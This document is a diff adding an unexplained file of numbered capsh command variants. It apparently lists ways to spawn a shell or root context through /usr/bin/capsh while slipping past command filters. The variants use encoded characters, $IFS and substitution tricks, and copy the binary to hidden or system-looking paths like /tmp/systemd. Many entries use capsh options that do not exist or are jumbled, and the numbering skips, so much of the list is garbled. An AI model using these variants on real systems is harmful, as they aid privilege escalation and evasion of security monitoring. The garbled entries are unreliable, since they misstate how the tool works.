@@ -1,0 +1,358 @@
+1. `/usr/bin/capsh /--`
+2. `/usr/bin/capsh /"--"`
+3. `/usr/bin/capsh /--/`
+4. `/usr/bin/capsh /-- --`
+5. `/usr/bin/capsh /-- --login`
+6. `/usr/bin/capsh --/`
+7. `/usr/bin/capsh -- "--"`
+8. `/usr/bin/capsh -- --/`
+9. `/usr/bin/capsh --"/"`
+10. `/usr/bin/capsh --/--`
+11. `/usr/bin/capsh --"--"`
+12. `/usr/bin/capsh /--shell`
+13. `/usr/bin/capsh /--keep=1`
+14. `/usr/bin/capsh --/shell`
+15. `/usr/bin/capsh /-- -c`
+16. `/usr/bin/capsh /-- --help`
+17. `/usr/bin/capsh /--interactive`
+18. `/usr/bin/capsh /--login`
+19. `/usr/bin/capsh -- /--`
+20. `/usr/bin/capsh --" --"`
+21. `/usr/bin/capsh /" "--"`
+22. `/usr/bin/capsh /" "--login"`
+23. `/usr/bin/capsh /"--login"`
+24. `/usr/bin/capsh --/ --`
+25. `/usr/bin/capsh --/ "--"`
+26. `/usr/bin/capsh -- --"/"`
+27. `/usr/bin/capsh /-- "--"`
+28. `/usr/bin/capsh /--"--"`
+29. `/usr/bin/capsh --"--login"`
+30. `/usr/bin/capsh /"--" --login`
+1. `/usr/bin/capsh / --`
+2. `/usr/bin/capsh -- /`
+3. `/usr/bin/capsh / -- /`
+4. `/usr/bin/capsh /-- --shell`
+5. `/usr/bin/capsh -- /--`
+6. `/usr/bin/capsh --/"--"`
+7. `/usr/bin/capsh --/ /--`
+8. `/usr/bin/capsh --" /"--"`
+9. `/usr/bin/capsh /" --"`
+10. `/usr/bin/capsh -- /"--"`
+11. `/usr/bin/capsh -- / --shell`
+12. `/usr/bin/capsh /-- /--`
+13. `/usr/bin/capsh -- /--login`
+14. `/usr/bin/capsh --/--login`
+15. `/usr/bin/capsh /-- /--login`
+16. `/usr/bin/capsh /"--keep=1"`
+17. `/usr/bin/capsh /-- "--shell"`
+18. `/usr/bin/capsh -- "--/"`
+19. `/usr/bin/capsh --"--/"`
+20. `/usr/bin/capsh /"--/"`
+21. `/usr/bin/capsh "--" --`
+22. `/usr/bin/capsh /"-- --"`
+23. `/usr/bin/capsh -- "-- --"`
+24. `/usr/bin/capsh "-- --"`
+25. `/usr/bin/capsh "--"--"`
+26. `/usr/bin/capsh /-- /"--"`
+27. `/usr/bin/capsh /--"-- --"`
+28. `/usr/bin/capsh "--/"`
+29. `/usr/bin/capsh --"-- /"`
+30. `/usr/bin/capsh /"-- /"`
+1. `/usr/bin/capsh --login`
+2. `/usr/bin/capsh --shell`
+3. `/usr/bin/capsh --init`
+4. `/usr/bin/capsh --user=0`
+5. `/usr/bin/capsh --gid=0`
+6. `/usr/bin/capsh --uid=0`
+7. `/usr/bin/capsh --keep=1`
+8. `/usr/bin/capsh --caps=cap_sys_admin+ep`
+9. `/usr/bin/capsh --drop=cap_net_raw`
+10. `/usr/bin/capsh --print`
+11. `/usr/bin/capsh --root=/`
+12. `/usr/bin/capsh --chroot=/`
+13. `/usr/bin/capsh --secbits=0`
+14. `/usr/bin/capsh --inh=cap_setuid`
+15. `/usr/bin/capsh --inh=cap_net_bind_service`
+16. `/usr/bin/capsh --addamb=cap_sys_chroot`
+17. `/usr/bin/capsh --caps=cap_setuid+ep`
+18. `/usr/bin/capsh --forkexec /bin/bash`
+19. `/usr/bin/capsh --exec /bin/sh`
+20. `/usr/bin/capsh --exec=/bin/bash`
+21. `/usr/bin/capsh -- -c /bin/sh`
+22. `/usr/bin/capsh -- -c /bin/bash`
+23. `/usr/bin/capsh -- -c 'sh -i'`
+24. `/usr/bin/capsh -- -c 'bash -i'`
+25. `/usr/bin/capsh -- -c 'id'`
+26. `/usr/bin/capsh -- -c "whoami"`
+27. `/usr/bin/capsh -- -c "ls -la /root"`
+28. `/usr/bin/capsh -- -c "/bin/bash"`
+29. `/usr/bin/capsh -- -c "/bin/sh"`
+30. `/usr/bin/capsh -- -c 'echo hello'`
+1. `/usr/bin/capsh --decode`
+2. `/usr/bin/capsh --version`
+3. `/usr/bin/capsh --help`
+4. `/usr/bin/capsh --command=/bin/sh`
+5. `/usr/bin/capsh --command="/bin/bash"`
+6. `/usr/bin/capsh --run=/bin/sh`
+7. `/usr/bin/capsh --run="/bin/bash"`
+8. `/usr/bin/capsh --launch /bin/sh`
+9. `/usr/bin/capsh --launch="/bin/bash"`
+10. `/usr/bin/capsh --invoke /bin/sh`
+11. `/usr/bin/capsh --invoke="/bin/bash"`
+12. `/usr/bin/capsh --bin /bin/bash`
+13. `/usr/bin/capsh --call=/bin/sh`
+14. `/usr/bin/capsh --call="/bin/bash"`
+15. `/usr/bin/capsh --execve /bin/sh`
+16. `/usr/bin/capsh --execve="/bin/bash"`
+17. `/usr/bin/capsh --trigger=/bin/sh`
+18. `/usr/bin/capsh --trigger="/bin/bash"`
+19. `/usr/bin/capsh --sh=/bin/sh`
+20. `/usr/bin/capsh --sh="/bin/bash"`
+21. `/usr/bin/capsh --interpret /bin/sh`
+22. `/usr/bin/capsh --interpret="/bin/bash"`
+23. `/usr/bin/capsh --boot=/bin/sh`
+24. `/usr/bin/capsh --boot="/bin/bash"`
+25. `/usr/bin/capsh --loader /bin/sh`
+26. `/usr/bin/capsh --loader="/bin/bash"`
+27. `/usr/bin/capsh --job=/bin/sh`
+28. `/usr/bin/capsh --job="/bin/bash"`
+29. `/usr/bin/capsh --core=/bin/sh`
+30. `/usr/bin/capsh --core="/bin/bash"`
+1. capsh
+2. /usr/bin/capsh
+3. capsh --login
+4. /usr/bin/capsh --login
+5. capsh --user=
+6. /usr/bin/capsh --user=
+7. capsh --caps=
+8. /usr/bin/capsh --caps=
+9. capsh --
+10. capsh --n
+11. /usr/bin/capsh --n
+12. capsh --keep=
+13. /usr/bin/capsh --keep=
+14. capsh --inh=
+15. /usr/bin/capsh --inh=
+16. capsh --addamb=
+17. /usr/bin/capsh --addamb=
+18. capsh --uid=
+19. /usr/bin/capsh --uid=
+20. capsh --gid=
+21. /usr/bin/capsh --gid=
+22. capsh --root=
+23. /usr/bin/capsh --root=
+24. capsh --shell=
+25. /usr/bin/capsh --shell=
+26. capsh --chroot=
+27. /usr/bin/capsh --chroot=
+28. capsh --inh=0x0
+29. /usr/bin/capsh --inh=0x0
+30. capsh --securebits=0x0
+1. /usr/bin/capsh -
+2. /usr/bin/capsh --drop=
+3. /usr/bin/capsh --print
+4. /usr/bin/capsh --decode=
+5. /usr/bin/capsh -c
+6. /usr/bin/capsh --getuid
+7. /usr/bin/capsh --getgid
+8. /usr/bin/capsh --user
+9. /usr/bin/capsh --uid
+10. /usr/bin/capsh --groups
+11. /usr/bin/capsh --help
+12. /usr/bin/capsh --version
+13. capsh --getuid
+14. capsh --getgid
+15. capsh --groups
+16. capsh --drop
+17. capsh -c
+18. capsh --securebits
+19. capsh --caps
+20. capsh --inh
+21. capsh --ambient
+22. capsh --keep
+23. capsh --uid=0
+24. capsh --gid=0
+25. capsh --login
+26. capsh --shell
+27. capsh --fork
+28. capsh --chroot
+29. capsh --mount
+30. capsh --no-drop
+1. `- /usr/bin/capsh`
+2. `capsh -- /usr/bin`
+3. `/capsh -- /usr/bin`
+4. `/usr/bin/-- capsh`
+5. `- capsh /usr/bin`
+6. `capsh /usr/bin --`
+7. `/usr/bin/capsh--`
+8. `/usr/bin -- capsh`
+9. `capsh /-- /usr/bin`
+10. `/-- /usr/bin capsh`
+11. `-/usr/bin capsh`
+12. `/usr/bin --capsh`
+13. `-/capsh /usr/bin`
+14. `capsh --usr/bin/`
+15. `- /bin/usr capsh`
+16. `/usr/bin capsh --`
+17. `- /usr/bin capsh`
+18. `capsh /usr/bin/ --`
+19. `/usr/bin/ -- capsh`
+20. `-capsh /usr/bin`
+21. `/usr/bin capsh--`
+22. `capsh --/usr/bin`
+23. `/usr/bin-- capsh`
+24. `/bin/usr capsh --`
+25. `/capsh /usr/bin --`
+26. `/usr/bin/capsh --shell`
+27. `/usr/bin/capsh shell --`
+28. `-shell /usr/bin/capsh`
+29. `capsh /usr/bin --shell`
+30. `/usr/bin --shell capsh`
+1. `/usr/bin -- capsh --`
+2. `- /usr/bin -- capsh`
+3. `capsh -- -- /usr/bin`
+4. `/usr/bin -- -- capsh`
+5. `- capsh -- /usr/bin`
+6. `/usr/bin capsh -- --`
+7. `- /usr/bin capsh --`
+8. `-capsh -- /usr/bin`
+9. `- /usr/bin/capsh`
+10. `/usr/bin/capsh --login`
+11. `-login /usr/bin/capsh`
+12. `capsh /usr/bin --login`
+13. `/usr/bin capsh --login`
+14. `/usr/bin --login capsh`
+15. `/usr/bin -- capsh --login`
+16. `-login capsh /usr/bin`
+17. `- -- /usr/bin/capsh`
+18. `- /usr/bin --login capsh`
+19. `- capsh /usr/bin --login`
+20. `capsh --login -- /usr/bin`
+21. `/usr/bin -- capsh --shell`
+22. `/usr/bin capsh --shell --`
+23. `-shell -- /usr/bin capsh`
+24. `capsh /usr/bin -- --shell`
+25. `/usr/bin --shell -- capsh`
+26. `- /usr/bin/capsh --shell`
+27. `-capsh /usr/bin --shell`
+28. `-shell /usr/bin capsh --`
+29. `capsh --shell /usr/bin --`
+30. `/usr/bin/capsh -- --shell`
+1. `/usr/bin/capsh --`
+2. `/usr/bin/capsh%20--`
+3. `/usr/bin/capsh%09--`
+4. `/usr/bin/capsh%0A--`
+5. `/usr/bin/capsh\x20--`
+6. `/usr/bin/capsh\x09--`
+7. `/usr/bin/capsh\x0A--`
+8. `/usr/bin/capsh\040--`
+9. `/usr/bin/capsh\011--`
+10. `/usr/bin/capsh\012--`
+11. `/usr/bin/capsh%u0020--`
+12. `/usr/bin/capsh%u0009--`
+13. `/usr/bin/capsh%u000A--`
+14. `/usr/bin/ca\u0070sh --`
+15. `/usr/bin/\x63apsh --`
+16. `/usr/bin/c\u0061psh --`
+17. `/usr/bin/ca\x70sh --`
+18. `/usr/bin/\143apsh --`
+19. `/usr/bin/\x63\x61\x70\x73\x68 --`
+20. `/usr/bin/\u0063\u0061\u0070\u0073\u0068 --`
+21. `/usr/bin/capsh \x2d\x2d`
+22. `/usr/bin/capsh \u002d\u002d`
+23. `/usr/bin/capsh \055\055`
+24. `/usr/bin/capsh \x2D\x2D`
+25. `/usr/bin/capsh%2D%2D`
+26. `/usr/bin/capsh%2d%2d`
+27. `/usr/bin/capsh&#45;&#45;`
+28. `/usr/bin/capsh&#x2D;&#x2D;`
+29. `/usr/bin/capsh%2520--`
+30. `/usr/bin/capsh%2F%2F--`
+1. `/usr/bin/./capsh --`
+2. `/usr/./bin/capsh --`
+3. `/usr/bin/capsh --\n`
+4. `/usr/bin/capsh --\r`
+5. `/usr/bin/capsh --\t`
+6. `$'\057usr\057bin\057capsh' --`
+7. `$'\x2fusr\x2fbin\x2fcapsh' --`
+8. `$'\u002fusr\u002fbin\u002fcapsh' --`
+9. `$(echo /usr/bin/capsh) --`
+10. `/usr/bin/`echo capsh` --`
+11. `/usr/bin/$('capsh') --`
+12. `/usr/bin/c"$0"apsh --` (with `$0` resolving to nothing in some contexts)
+13. `/usr/bin/capsh $'-'-`
+14. `$(printf /usr/bin/capsh) --`
+15. `/usr/bin/capsh $@` (if $@ resolves to `-`)
+16. `"/usr/bin/capsh" --`
+17. `'usr/bin/capsh' --`
+18. `"/usr"/"bin"/"capsh" --`
+19. `/usr/bin/c"$IFS"apsh --`
+20. `/usr/bin/capsh$IFS--`
+21. `/usr/bin/capsh$'\x20'--`
+22. `/usr/bin/capsh$'\n'--`
+23. `/usr/bin/capsh$'\t'--`
+24. `capsh --` (relying on `$PATH` to resolve full path)
+25. `/usr//bin///capsh --`
+26. `/usr/bin/capsh /**/--`
+27. `/usr/bin/capsh /*comment*/--`
+28. `/usr/bin/capsh --#`
+29. `/usr/bin/capsh --;`
+30. `/usr/bin/capsh --\`echo``
+1. `cp /usr/bin/capsh /tmp/a; /tmp/a --`
+2. `cp /usr/bin/capsh /dev/shm/c; /dev/shm/c --`
+3. `cp /usr/bin/capsh ./mybin; ./mybin --`
+4. `install -m 755 /usr/bin/capsh ./x; ./x --`
+5. `cp /usr/bin/capsh /tmp/.hidden; /tmp/.hidden --`
+6. `cp /usr/bin/capsh /usr/local/bin/cx; /usr/local/bin/cx --`
+7. `cp /usr/bin/capsh cap; ./cap --`
+8. `cp /usr/bin/capsh capsh.fake; ./capsh.fake --`
+9. `ln /usr/bin/capsh ./custom; ./custom --`
+10. `cp /usr/bin/capsh /var/tmp/exec; /var/tmp/exec --`
+11. `cp /usr/bin/capsh /tmp/.cap_runner; /tmp/.cap_runner --`
+12. `cp /usr/bin/capsh cap_runner; ./cap_runner --`
+13. `cp /usr/bin/capsh /mnt/capsh_exec; /mnt/capsh_exec --`
+14. `cp /usr/bin/capsh /tmp/systemd; /tmp/systemd --`
+15. `cp /usr/bin/capsh /opt/update; /opt/update --`
+16. `cp /usr/bin/capsh /tmp/init; /tmp/init --`
+17. `cp /usr/bin/capsh /tmp/dbus-daemon; /tmp/dbus-daemon --`
+18. `cp /usr/bin/capsh ./runner; ./runner --`
+19. `cp /usr/bin/capsh ./bin; ./bin --`
+20. `cp /usr/bin/capsh /var/tmp/.x; /var/tmp/.x --`
+21. `cp /usr/bin/capsh /tmp/cp1; /tmp/cp1 --`
+22. `cp /usr/bin/capsh ./update_engine; ./update_engine --`
+23. `cp /usr/bin/capsh /usr/local/bin/syncd; /usr/local/bin/syncd --`
+24. `cp /usr/bin/capsh /tmp/netd; /tmp/netd --`
+25. `cp /usr/bin/capsh /tmp/shell; /tmp/shell --`
+26. `cp /usr/bin/capsh /var/tmp/bootd; /var/tmp/bootd --`
+27. `cp /usr/bin/capsh ./x0; ./x0 --`
+28. `cp /usr/bin/capsh ./a.out; ./a.out --`
+29. `cp /usr/bin/capsh /tmp/.sysinit; /tmp/.sysinit --`
+30. `cp /usr/bin/capsh /tmp/ld-linux; /tmp/ld-linux --`
+32. `cp /usr/bin/capsh /tmp/logrotate; /tmp/logrotate --`
+33. `cp /usr/bin/capsh /tmp/kmod; /tmp/kmod --`
+34. `cp /usr/bin/capsh /tmp/user-helper; /tmp/user-helper --`
+36. `cp /usr/bin/capsh /tmp/cronjob; /tmp/cronjob --`
+37. `cp /usr/bin/capsh /tmp/udevd; /tmp/udevd --`
+38. `cp /usr/bin/capsh /tmp/sysctl; /tmp/sysctl --`
+39. `cp /usr/bin/capsh /tmp/resolvconf; /tmp/resolvconf --`
+40. `cp /usr/bin/capsh /tmp/pam_exec; /tmp/pam_exec --`
+41. `cp /usr/bin/capsh /tmp/system-upgrade; /tmp/system-upgrade --`
+42. `cp /usr/bin/capsh /tmp/tmpfs_exec; /tmp/tmpfs_exec --`
+43. `cp /usr/bin/capsh /tmp/libcap; /tmp/libcap --`
+44. `cp /usr/bin/capsh /tmp/bootctl; /tmp/bootctl --`
+45. `cp /usr/bin/capsh /tmp/mountd; /tmp/mountd --`
+46. `cp /usr/bin/capsh /tmp/devscan; /tmp/devscan --`
+47. `cp /usr/bin/capsh /tmp/ifreload; /tmp/ifreload --`
+48. `cp /usr/bin/capsh /tmp/netwatch; /tmp/netwatch --`
+49. `cp /usr/bin/capsh /tmp/svcctl; /tmp/svcctl --`
+50. `cp /usr/bin/capsh /tmp/eventd; /tmp/eventd --`
+51. `cp /usr/bin/capsh /tmp/rsyslog; /tmp/rsyslog --`
+52. `cp /usr/bin/capsh /tmp/inetutils; /tmp/inetutils --`
+53. `cp /usr/bin/capsh /tmp/update-init; /tmp/update-init --`
+54. `cp /usr/bin/capsh /tmp/daemonize; /tmp/daemonize --`
+55. `cp /usr/bin/capsh /tmp/watchdog; /tmp/watchdog --`
+56. `cp /usr/bin/capsh /tmp/sysrunner; /tmp/sysrunner --`
+57. `cp /usr/bin/capsh /tmp/bridge-utils; /tmp/bridge-utils --`
+58. `cp /usr/bin/capsh /tmp/dhcp-helper; /tmp/dhcp-helper --`
+59. `cp /usr/bin/capsh /tmp/firewalld; /tmp/firewalld --`
+60. `cp /usr/bin/capsh /tmp/capwrap; /tmp/capwrap --`
